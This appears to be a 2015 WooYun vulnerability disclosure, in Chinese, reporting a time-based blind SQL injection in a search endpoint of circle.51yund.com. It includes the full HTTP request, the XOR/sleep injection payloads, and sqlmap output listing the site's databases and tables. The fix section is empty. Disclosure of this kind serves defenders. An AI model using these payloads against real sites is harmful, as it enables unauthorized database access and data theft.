wybug_detail:
漏洞详情 披露状态：   									2015-05-15：	细节已通知厂商并且等待厂商处理中									2015-05-15：	厂商已经确认，细节仅向厂商公开									2015-05-25：	细节向核心白帽子及相关领域专家公开									2015-06-04：	细节向普通白帽子公开									2015-06-14：	细节向实习白帽子公开									2015-06-29：	细节向公众公开  简要描述： 233 详细说明：  
POST /searchCircleByKey HTTP/1.1Content-Length: 138Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://circle.51yund.com/Host: circle.51yund.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.0 Safari/537.36Accept: */*key=1payload:key='XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'*/key='XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'*/
   漏洞证明：  
---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: key='XOR(if(now()=sysdate(),(SELECT (CASE WHEN (4143=4143) THEN SLEEP(5) ELSE 4143*(SELECT 4143 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)),0))OR'---back-end DBMS: MySQL 5.0.12available databases [3]:[*] information_schema[*] sport[*] test[14:00:55] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] Y1[14:01:27] [INFO] adjusting time delay to 1 second due to good response times98[14:01:54] [INFO] retrieved: activity_ads_for_web.........198张表
   修复方案：  ~~   版权声明：转载请注明来源 路人甲@乌云
